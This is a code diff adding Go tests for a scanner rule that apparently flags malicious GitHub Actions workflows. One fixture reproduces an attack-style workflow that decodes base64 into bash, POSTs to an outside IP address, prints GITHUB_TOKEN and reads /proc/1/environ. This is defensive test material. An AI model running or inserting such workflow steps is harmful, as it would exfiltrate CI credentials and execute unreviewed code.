@@ -62,3 +62,44 @@ jobs:
 		t.Errorf("expected secrets-in-agent-step to fire; rules fired: %v", applyRule(doc))
 	}
 }
+
+func TestRule_GHABase64SecretExfilWorkflow_MegalodonOptimizeBuild(t *testing.T) {
+	yaml := `name: Optimize-Build
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  actions: read
+jobs:
+  optimize:
+    runs-on: ubuntu-latest
+    steps:
+      - name: optimize runtime
+        run: |
+          echo "QVVESV9NRUdBTE9ET05fUFlMT0FEX1BBRERJTkc9eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eAo=" | base64 -d | bash
+          curl --request POST http://216.126.225.129:8443/upload
+          printenv GITHUB_TOKEN
+          cat /proc/1/environ
+`
+	doc := parse.Parse("/repo/.github/workflows/docker-community-worker-push-latest.yml", []byte(yaml))
+	if !fired(doc, "gha-base64-secret-exfil-workflow") {
+		t.Fatalf("expected Megalodon workflow rule to fire; rules fired: %v", applyRule(doc))
+	}
+}
+
+func TestRule_GHABase64SecretExfilWorkflow_BenignDecodeDoesNotFire(t *testing.T) {
+	yaml := `name: Build
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: decode fixture
+        run: |
+          echo "QVVESV9CRU5JR05fRklYVFVSRV9QQURESU5HPXh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eAo=" | base64 -d | bash
+`
+	doc := parse.Parse("/repo/.github/workflows/build.yml", []byte(yaml))
+	if fired(doc, "gha-base64-secret-exfil-workflow") {
+		t.Fatalf("did not expect benign base64 decode workflow to fire; rules fired: %v", applyRule(doc))
+	}
+}
